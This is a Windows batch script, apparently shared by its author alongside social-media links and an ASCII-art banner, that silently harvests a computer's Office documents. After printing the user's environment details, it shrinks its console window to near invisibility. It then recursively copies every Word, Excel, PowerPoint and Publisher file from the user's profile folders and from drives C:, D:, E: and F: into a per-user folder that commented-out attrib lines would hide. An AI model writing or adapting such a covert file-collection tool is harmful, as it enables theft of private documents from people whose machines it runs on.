@rem Sigueme en las redes Sociales:
@rem Blogger          https://lpericena.blogspot.com/
@rem Github            https://github.com/Pericena
@rem youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
@rem pinterest        https://es.pinterest.com/lushiopericena/
@rem twitter             https://twitter.com/LPericena
@rem linkedin         https://www.linkedin.com/in/lpericena/
@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
@rem pagina facebook  https://www.facebook.com/lpericena
@rem sitio web        https://pericena.wordpress.com/
@rem vimeo         https://vimeo.com/lpericena
@rem instagram      https://www.instagram.com/lpericena/
@rem remote      https://remote.com/luishinopericena-choque
@rem google+   https://plus.google.com/u/0/114054031405340478901
@rem kiwi       https://kiwi.qa/LuishinoC
@rem App    https://apps.facebook.com/167466933725219
@rem Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
@rem socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
@rem teachlr    https://teachlr.com/lpericena
@rem wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
@rem ask          https://ask.fm/Lpericena
@rem stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
@rem wix https://lpericena.wixsite.com/curriculumvitae


@echo off
color C

echo.
echo.
echo            u@7.          Autor: Luishino Pericena Choque
echo        :uMB@BMOZ1L,                                                   
echo   :J@B@B@@MLGB@B@B@                       vPL  iXu :.                 
echo B@B@Bv:     L@MMM@@         S@@@B@Bu     @Br: B@r; @Z                 
echo @O@B:       5@M8MB@       :B@,    :B@   :B    @.                      
echo OEM@;       S@OOO@M       BB        B@ SB@qENEBM87 Mi   F@B@B.  F@B@0 
echo MNBB7       XBMOMBB      i@         uB  r@,  .@r   BF .BB.  :  Bk   XB
echo O0M@r       F@MOO@B      rB         u@  .@    B:   @L B@      8@ir77L@
echo ME@Bv       X@M8M@@       @O        @M  :B    @i   BL @q      @B.:rii 
echo B@@@7       F@MMO@B       :@B,    ;@B   i@    B7   @U v@r     i@:     
echo @Sv.        1BMOMB@         q@@B@B@7    iB.   @;   @J  i@B@B@  :@B@B@v
echo    ;FMOEur. 5@M@B@B       https://lpericena.blogspot.com/
echo        i2O@B@EXj7i.   
echo.
echo           %OS%  %COMPUTERNAME% %USERNAME% %DATE% %TIME%
echo.
echo %USERNAME%
echo %USERPROFILE%
echo %ALLUSERSPROFILE%
echo %APPDATA%
echo %COMMONPROGRAMFILES%
echo %CMDCMDLINE%
echo %CMDEXTVERSION%
echo %COMPUTERNAME%
echo %COMSPEC%


mode con lines=1 cols=17
rem Attrib /s /d +s +h "Office"
IF NOT EXIST ".\Office\"%USERNAME% MD ".\Office\"%USERNAME%
cd ".\Office\"%USERNAME%
rem Attrib /s /d +s +h "Office"
for /R %USERPROFILE%\Pictures\ %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
rem Attrib /s /d +s +h "Office"
for /R %USERPROFILE%\Documents\ %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\Desktop\ %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\ %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\Favorites %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\Videos %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\Downloads  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\Descargas  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R %USERPROFILE%\Imagenes  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R E:\  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R C:\  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R F:\  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
for /R D:\  %%x in (*.doc,*.docx,*.xlsx,*.pptx,*.pps,*.xls,*.xlm,*.pub,*.xps,*.ppt ) do copy "%%x" ".\"
EXIT

Attrib /s /d +s +h "Office"

Lugares:
Documentos\Documents 
Imagenes\Pictures 
Musica\Music 
Videos\Videos 
Escritorio\Desktop 
Descargas\Downloads 
Contactos\Contacts 
Favoritos\Favorites